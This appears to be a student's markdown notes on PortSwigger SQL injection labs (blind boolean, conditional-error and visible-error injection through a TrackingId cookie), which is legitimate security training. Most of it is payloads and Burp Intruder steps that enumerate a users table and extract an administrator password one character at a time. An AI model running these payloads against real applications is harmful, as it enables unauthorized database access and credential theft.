<div align="center">
  <h1>-------------------------- SQLi LABS 002 ---------------------------</h1>
</div>

# [CheatSheet](https://portswigger.net/web-security/sql-injection/cheat-sheet)

## Lab 10: Blind SQL injection with conditional responses [Link](https://portswigger.net/web-security/learning-paths/sql-injection/sql-injection-exploiting-blind-sql-injection-by-triggering-conditional-responses/sql-injection/blind/lab-conditional-responses#)
- This injection will be used in `Cookie` section in `TrackingID` input field of the page.

```sql
TrackingId=mCKLbQonMlRUp42B' AND '1'='1;  #Returns 'Welcome Back', This boolean condition means the page is vul to Bilnd SQLi
TrackingId=mCKLbQonMlRUp42B' AND '1'='2; #Doesn't Returns 'Welcome Back' 

TrackingId=mCKLbQonMlRUp42B' AND (SELECT 'a' FROM users LIMIT 1)='a;  #Confirming that there is a table called users
TrackingId=mCKLbQonMlRUp42B' AND (SELECT 'a' FROM users where username='administrator')='a; #confirming that there is a user called administrator

TrackingId=mCKLbQonMlRUp42B' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>1)='a #confirming that the password is greater than 1 character in length.
TrackingId=mCKLbQonMlRUp42B' AND (SELECT 'a' FROM users where username='administrator' AND LENGTH(password)>19)='a; #Password is 20 char long
```


### After determining the length of the password, the next step is to `test the character at each position` to determine its value.
- This step involve `Intruder` Module, set the Type: Sniper, Position: $a$, Intruder Setting: Grep-Match 'Welcome Back'
- Injection: `TrackingId=mCKLbQonMlRUp42B' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='§a§;`
- Repeat the same step for every position i.e SUBSTRING(password,2 to 20,1)
- On correct position guessed by payload, it'll flag the `Welcome Back` in result.
- Take the guessed char & note it down.
- ![image](https://github.com/user-attachments/assets/c07e3d8c-e54b-40b1-a268-48a0263e764e)

### Related Concepts: SUBSTRING(string, start_position, length)
```
string: The string from which you want to extract the substring.
start_position: The position in the string to start extracting (1-based index).
length: The number of characters to extract.
```

## Lab 11: Blind SQL injection with conditional errors [Link](https://portswigger.net/web-security/learning-paths/sql-injection/sql-injection-error-based-sql-injection/sql-injection/blind/lab-conditional-errors)
```sql
If there is Error, means the Query is getting processed by Server & We can give conditions to test for the payloads

TrackingId=3K2lIneuWTHL6FqO' Error
TrackingId=3K2lIneuWTHL6FqO'' No Error

'||(SELECT '')||' error
'||(SELECT '' from dual)||' No error (ORacle DB)

TrackingId=3K2lIneuWTHL6FqO'||(SELECT '' from Incorrect_table)||'; Error means the query is getting processed at server end
TrackingId=3K2lIneuWTHL6FqO'||(SELECT '' from users where ROWNUM=1)||'; No error means the `Users` table exists in DB

TrackingId=3K2lIneuWTHL6FqO'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||'; Error means the query is getting processed at server end
TrackingId=3K2lIneuWTHL6FqO'||(SELECT CASE WHEN (1=2) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||'; Codition True, No Error with this.

TrackingId=3K2lIneuWTHL6FqO'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users where username='administrator')||';  Error, confirms that there is a user named Administrator
TrackingId=3K2lIneuWTHL6FqO'||(SELECT CASE WHEN LENGTH(password)>1 THEN TO_CHAR(1/0) ELSE '' END FROM users where username='administrator')||';  Error, confirms that the password Length is > 1

TrackingId=3K2lIneuWTHL6FqO'||(SELECT CASE WHEN LENGTH(password)>=20 THEN TO_CHAR(1/0) ELSE '' END FROM users where username='administrator')||'; Confirms the Length is of 20 characters
```

- Use SUBSTR( string, start_position [, length ]) to check the password length
- Use Intruder's Sniper Attack type to fuzz the password by comparing each & every position from SUBSTR(password,1,1) to SUBSTR(password,20,1)
- Copy each letter from result if recieved Error 500, use the same to login after extracting all 20 letters.

```sql
TrackingId=3K2lIneuWTHL6FqO'||(SELECT CASE WHEN SUBSTR(password,1,1)='a' THEN TO_CHAR(1/0) ELSE '' END FROM users where username='administrator')||';  

TrackingId=3K2lIneuWTHL6FqO'||(SELECT CASE WHEN SUBSTR(password,20,1)='§a§' THEN TO_CHAR(1/0) ELSE '' END FROM users where username='administrator')||';  

hn8u07gig6zkt9947d47

- Now, login with extracted passsword.
```


## Lab 11: Visible error-based SQL injection [Link](https://portswigger.net/web-security/learning-paths/sql-injection/sql-injection-error-based-sql-injection/sql-injection/blind/lab-sql-injection-visible-error-based)

- Capture the GET/ request: Look for the Cookie: "TrackingId" > Send it to Repeater.
- In Repeater, append a single quote to the value of your TrackingId cookie and send the request.
`TrackingId=ogAZZfxtOKUELbuJ'` > Observe the error > TrackingId=ogAZZfxtOKUELbuJ'-- > Comment out the rest of the query > Observe the error.
- Adapt the query to include a generic SELECT subquery and cast the returned value to an int data type: `TrackingId=ogAZZfxtOKUELbuJ' AND CAST((SELECT 1) AS int)--` > Observe the Error
- Modify the Query: `TrackingId=ogAZZfxtOKUELbuJ' AND 1=CAST((SELECT 1) AS int)--`
- Adapt your generic SELECT statement so that it retrieves usernames from the database: `TrackingId=ogAZZfxtOKUELbuJ' AND 1=CAST((SELECT username FROM users) AS int)--` > Observe the error.
- Delete the TrackingID value & Observe the error.
- Modify the query to return only one row: `TrackingId=' AND 1=CAST((SELECT username FROM users LIMIT 1) AS int)`
- Try to leak the Creds > Look for Creds on the page.


## Lab 12: Blind SQL injection with time delays and information retrieval [Link](https://portswigger.net/web-security/learning-paths/sql-injection/sql-injection-exploiting-blind-sql-injection-by-triggering-time-delays/sql-injection/blind/lab-time-delays-info-retrieval)
- 

